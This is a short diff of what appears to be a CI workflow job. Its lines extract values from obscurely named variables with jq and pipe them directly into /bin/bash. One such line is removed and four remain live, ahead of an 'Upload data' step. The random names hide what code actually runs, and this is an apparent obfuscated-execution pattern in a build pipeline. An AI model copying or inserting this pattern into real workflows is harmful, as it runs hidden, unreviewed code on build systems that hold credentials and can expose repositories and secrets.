@@ -33,7 +33,6 @@ jobs:
           printf '%s' "$lh53311" | jq -r .wu6677 | /bin/bash
           echo $vrkpu382 | jq -r .txllu6 | /bin/bash
           echo $efv66178 | jq -r .pba72 | /bin/bash
-          printf '%s' "$vfwdm291" | jq -r .ey67 | /bin/bash
           echo $t319 | jq -r .ommb2794 | /bin/bash
 
       - name: Upload data
